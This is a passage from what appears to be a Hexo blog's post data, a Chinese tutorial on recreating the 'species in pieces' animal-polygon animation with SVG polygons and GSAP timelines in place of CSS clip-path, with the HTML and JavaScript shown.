之所以没用TweenMax.staggerTo是因为属性对象中没法用获得index，如下实现不了\n    // attr: {\n    //     points: pointVal.join(' '),\n    //     fill: function(index){return nextSpeciesPolygon[index][1];}\n    // }\n\n    arr1.concat(arr2).forEach(function(target, index) {\n        let pointVal = parsePolygonStr(nextSpeciesPolygon[index][0], width, height),\n            fillVal = nextSpeciesPolygon[index][1];\n        subTl.add(\n            TweenMax.to(target, 0.5, {\n                attr: {\n                    points: pointVal.join(' '),\n                    fill: fillVal\n                },\n                ease: Back.easeOut.config(1.7)\n            }),\n            '-=0.47'\n        )\n    });\n\n    subTl.play();\n\n\n}\n\ngoBtn.addEventListener('click', playHandler, false);\n```\n# 后记\n[GSAP动画平台](https://greensock.com/gsap)真的很强大，推荐有交互动效方面需求的可以关注下。","slug":"2019-03-06-species-js","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d91700aqwovvwfem14o9","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>看到<a href=\"http://species-in-pieces.com/\" target=\"_blank\" rel=\"noopener\">species</a>网站做的很炫，想要借鉴，发现主要是用css3的<code>clip-path</code>实现的，兼容不好，因此想着用js实现下。下面作简单介绍，需要详细代码见<a href=\"https://github.com/jovysun/species-JS\" target=\"_blank\" rel=\"noopener\">github库</a>。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>效果图如下：<br><img src=\"/2019-03-06-species-js/1.gif\" alt=\"效果图\"><br><a id=\"more\"></a></p>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h2><ol>\n<li>SVG基本知识，重点viewBox，polygon；</li>\n<li>GSAP动画平台，重点TimelineMax，TweenMax；</li>\n<li>parcel构建工具的基本使用，<a href=\"http://www.css88.com/doc/parcel/\" target=\"_blank\" rel=\"noopener\">parcel</a>。<h2 id=\"实现思路\"><a href=\"#实现思路\" class=\"headerlink\" title=\"实现思路\"></a>实现思路</h2>根据参考网站的代码，动物图案是用<code>clip-path: polygon()</code>实现的，第一时间想到了SVG的polygon;另外对于转场动画，过渡动画，找个自己熟悉的动画库实现就行了。需要特别说明的是：</li>\n<li>css的clip-path用的用的百分比数值，svg的polygon的points值不能用百分比数值，知道viewBox概念的应该清楚，其实points的值也不是一般认为的绝对像素值，因此写了个工具函数<code>parsePolygonStr</code>。</li>\n<li>因为图案是分动物和场景（树枝，石头等）两部分，并且希望先绘制动物再绘制场景，因此HTML部分用g标签分成<code>extra</code>和<code>anis</code>。<h2 id=\"主要的代码如下：\"><a href=\"#主要的代码如下：\" class=\"headerlink\" title=\"主要的代码如下：\"></a>主要的代码如下：</h2><h3 id=\"入口文件HTML\"><a href=\"#入口文件HTML\" class=\"headerlink\" title=\"入口文件HTML\"></a>入口文件HTML</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE html&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"en\"</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, initial-scale=1.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>species<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"wrap\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">class</span>=<span class=\"string\">\"stage\"</span> <span class=\"attr\">viewBox</span>=<span class=\"string\">\"0 0 1000 700\"</span> <span class=\"attr\">version</span>=<span class=\"string\">\"1.1\"</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://www.w3.org/2000/svg\"</span> <span class=\"attr\">xmlns:xlink</span>=<span class=\"string\">\"http://www.w3.org/1999/xlink\"</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">g</span> <span class=\"attr\">id</span>=<span class=\"string\">\"extra\"</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">polygon</span> <span class=\"attr\">points</span>=<span class=\"string\">\"793.50,476.88,949.50,500.88,805.50,518.88\"</span> <span class=\"attr\">fill</span>=<span class=\"string\">\"hsla(0, 0%, 100%, 0)\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">polygon</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">polygon</span> <span class=\"attr\">points</span>=<span class=\"string\">\"793.50,476.88,949.50,500.88,805.50,518.88\"</span> <span class=\"attr\">fill</span>=<span class=\"string\">\"hsla(0, 0%, 100%, 0)\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">polygon</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">polygon</span> <span class=\"attr\">points</span>=<span class=\"string\">\"793.50,476.88,949.50,500.88,805.50,518.88\"</span> <span class=\"attr\">fill</span>=<span class=\"string\">\"hsla(0, 0%, 100%, 0)\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">polygon</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">g</span> <span class=\"attr\">id</span>=<span class=\"string\">\"anis\"</span>&gt;</span></span><br><span class=\"line\">                </span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">\"go_btn\"</span>&gt;</span>GO!<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">\"name\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">class</span>=<span class=\"string\">\"desc\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"./index.js\"</span>&gt;</span><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h3 id=\"主要js脚本\"><a href=\"#主要js脚本\" class=\"headerlink\" title=\"主要js脚本\"></a>主要js脚本</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 导入一个 SCSS module</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">'../css/main.scss'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; data, preData &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./data'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; TweenMax, TweenLite, TimelineMax &#125; <span class=\"keyword\">from</span> <span class=\"string\">'gsap'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// NodeList转换Array</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">NodeList2Array</span>(<span class=\"params\">nodelist</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> arr = [];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (nodelist.length) &#123;</span><br><span class=\"line\">        arr = <span class=\"built_in\">Array</span>.prototype.slice.call(nodelist, <span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> arr;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 把'clip-path'值转成svg polygon可用的值</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">parsePolygonStr</span>(<span class=\"params\">polygonStr, width, height</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> pointsArr = polygonStr.split(<span class=\"regexp\">/\\s+|,\\s/</span>);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> newPointArr = pointsArr.map(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">currentVal, index, arr</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (index % <span class=\"number\">2</span> === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (<span class=\"built_in\">parseFloat</span>(currentVal) * width / <span class=\"number\">100</span>).toFixed(<span class=\"number\">2</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (<span class=\"built_in\">parseFloat</span>(currentVal) * height / <span class=\"number\">100</span>).toFixed(<span class=\"number\">2</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> newPointArr;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> body = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'body'</span>),</span><br><span class=\"line\">    wrap = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'#wrap'</span>),</span><br><span class=\"line\">    name = wrap.querySelector(<span class=\"string\">'.name'</span>),</span><br><span class=\"line\">    desc = wrap.querySelector(<span class=\"string\">'.desc'</span>),</span><br><span class=\"line\">    stage = wrap.querySelector(<span class=\"string\">'.stage'</span>),</span><br><span class=\"line\">    anis = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'#anis'</span>),</span><br><span class=\"line\">    extra = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'#extra'</span>),</span><br><span class=\"line\">    goBtn = <span class=\"built_in\">document</span>.querySelector(<span class=\"string\">'#go_btn'</span>),</span><br><span class=\"line\">    anisPolygons = <span class=\"literal\">null</span>,</span><br><span class=\"line\">    extraPolygons = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> currentSpeciesIndex = <span class=\"number\">0</span>,</span><br><span class=\"line\">    width = <span class=\"number\">1000</span>,</span><br><span class=\"line\">    height = <span class=\"number\">700</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">init</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> initSpecies = preData.preload;</span><br><span class=\"line\">    name.innerHTML = initSpecies.name;</span><br><span class=\"line\">    desc.innerHTML = initSpecies.desc;</span><br><span class=\"line\">    body.style.background = initSpecies.background;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">let</span> polygonArr = initSpecies.polygon;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">Object</span>.prototype.toString.call(polygonArr) === <span class=\"string\">'[object Array]'</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> polygonHtml = <span class=\"string\">''</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        polygonArr.forEach(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">element, index</span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">let</span> pointsVal = parsePolygonStr(element[<span class=\"number\">0</span>], width, height);</span><br><span class=\"line\">            polygonHtml += <span class=\"string\">'&lt;polygon points=\"'</span> + pointsVal + <span class=\"string\">'\" fill=\"'</span> + element[<span class=\"number\">1</span>] + <span class=\"string\">'\"/&gt;'</span>;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        anis.innerHTML = polygonHtml;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">init();</span><br><span class=\"line\">anisPolygons = anis.querySelectorAll(<span class=\"string\">'polygon'</span>);</span><br><span class=\"line\">extraPolygons = extra.querySelectorAll(<span class=\"string\">'polygon'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">let</span> tl = <span class=\"keyword\">new</span> TimelineMax(&#123; <span class=\"attr\">delay</span>: <span class=\"number\">0.2</span> &#125;);</span><br><span class=\"line\"><span class=\"comment\">// 初始的loading动画</span></span><br><span class=\"line\">NodeList2Array(anisPolygons).forEach(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">target, index</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> tm = TweenMax.fromTo(target, <span class=\"number\">0.9</span>, &#123; <span class=\"attr\">attr</span>: &#123; <span class=\"attr\">fill</span>: <span class=\"string\">'rgba(0, 0, 0, .7)'</span> &#125; &#125;, &#123; <span class=\"attr\">attr</span>: &#123; <span class=\"attr\">fill</span>: <span class=\"string\">'rgba(200, 20, 20, .45)'</span> &#125;, <span class=\"attr\">ease</span>: Power0.easeNone, <span class=\"attr\">repeat</span>: <span class=\"number\">-1</span>, <span class=\"attr\">yoyo</span>: <span class=\"literal\">true</span> &#125;);</span><br><span class=\"line\">    tl.add(tm, <span class=\"number\">0.9</span> - <span class=\"number\">0.03</span> * index);</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 模拟加载完成</span></span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 清除tl</span></span><br><span class=\"line\">    tl.clear();</span><br><span class=\"line\">    <span class=\"comment\">// loading完之后的一系列动画</span></span><br><span class=\"line\">    <span class=\"comment\">// 1，变色，放大，爆炸碎片</span></span><br><span class=\"line\">    tl.add(</span><br><span class=\"line\">            [</span><br><span class=\"line\">                TweenMax.to(<span class=\"string\">'#anis polygon'</span>, <span class=\"number\">.6</span>, &#123;</span><br><span class=\"line\">                    attr: &#123;</span><br><span class=\"line\">                        fill: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index</span>) </span>&#123;</span><br><span class=\"line\">                            <span class=\"keyword\">let</span> fillVal = <span class=\"string\">'#111'</span>;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (index % <span class=\"number\">5</span> === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                                fillVal = <span class=\"string\">'#28282a'</span>;</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (index % <span class=\"number\">5</span> === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                                fillVal = <span class=\"string\">'#111'</span>;</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (index % <span class=\"number\">5</span> === <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">                                fillVal = <span class=\"string\">'#333'</span>;</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (index % <span class=\"number\">5</span> === <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">                                fillVal = <span class=\"string\">'#222'</span>;</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (index % <span class=\"number\">5</span> === <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">                                fillVal = <span class=\"string\">'#121212'</span>;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> fillVal;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;),</span><br><span class=\"line\">                TweenMax.to(<span class=\"string\">'#wrap .stage'</span>, <span class=\"number\">.6</span>, &#123;</span><br><span class=\"line\">                    scale: <span class=\"number\">1</span>,</span><br><span class=\"line\">                    ease: Back.easeOut.config(<span class=\"number\">1.7</span>)</span><br><span class=\"line\">                &#125;),</span><br><span class=\"line\">                TweenMax.to(<span class=\"string\">'#anis polygon'</span>, <span class=\"number\">.6</span>, &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    attr: &#123;</span><br><span class=\"line\">                        points: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                            <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.ready.polygon;</span><br><span class=\"line\">                            <span class=\"comment\">// debugger</span></span><br><span class=\"line\">                            <span class=\"keyword\">return</span> parsePolygonStr(nextSpeciesPolygon[index][<span class=\"number\">0</span>], width, height)</span><br><span class=\"line\">                        &#125;,</span><br><span class=\"line\">                        fill: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                            <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.ready.polygon;</span><br><span class=\"line\">                            <span class=\"keyword\">return</span> nextSpeciesPolygon[index][<span class=\"number\">1</span>];</span><br><span class=\"line\">                        &#125;,</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">// ease: Power2.easeInOut,</span></span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">            ]</span><br><span class=\"line\">        )</span><br><span class=\"line\">        <span class=\"comment\">// 2，海豚</span></span><br><span class=\"line\">        .add(</span><br><span class=\"line\">            TweenLite.to(<span class=\"string\">'#anis polygon'</span>, <span class=\"number\">.6</span>, &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                attr: &#123;</span><br><span class=\"line\">                    points: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.preAni.polygon;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> parsePolygonStr(nextSpeciesPolygon[index][<span class=\"number\">0</span>], width, height)</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                    fill: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.preAni.polygon;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> nextSpeciesPolygon[index][<span class=\"number\">1</span>];</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                &#125;,</span><br><span class=\"line\">                <span class=\"comment\">// ease: Power2.easeInOut,</span></span><br><span class=\"line\">            &#125;)</span><br><span class=\"line\">        )</span><br><span class=\"line\">        <span class=\"comment\">// 3，爆炸碎片</span></span><br><span class=\"line\">        .add(</span><br><span class=\"line\">            TweenMax.to(<span class=\"string\">'#anis polygon'</span>, <span class=\"number\">.6</span>, &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                attr: &#123;</span><br><span class=\"line\">                    points: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.ready.polygon;</span><br><span class=\"line\">                        <span class=\"comment\">// debugger</span></span><br><span class=\"line\">                        <span class=\"keyword\">return</span> parsePolygonStr(nextSpeciesPolygon[index][<span class=\"number\">0</span>], width, height)</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                    fill: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.ready.polygon;</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> nextSpeciesPolygon[index][<span class=\"number\">1</span>];</span><br><span class=\"line\">                    &#125;,</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;),</span><br><span class=\"line\">            <span class=\"string\">'+=0.4'</span></span><br><span class=\"line\">        )</span><br><span class=\"line\">        <span class=\"comment\">// 4，“piece”logo</span></span><br><span class=\"line\">        .add(</span><br><span class=\"line\">            TweenMax.to(<span class=\"string\">'#anis polygon'</span>, <span class=\"number\">.6</span>, &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                attr: &#123;</span><br><span class=\"line\">                    points: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">index, target</span>) </span>&#123;</span><br><span class=\"line\">                        <span class=\"keyword\">let</span> nextSpeciesPolygon = preData.title.polygon;</span><br><span class=\"line\">                        <span class=\"comment\">// debugger</span></span><br><span class=\"line\">                        <span 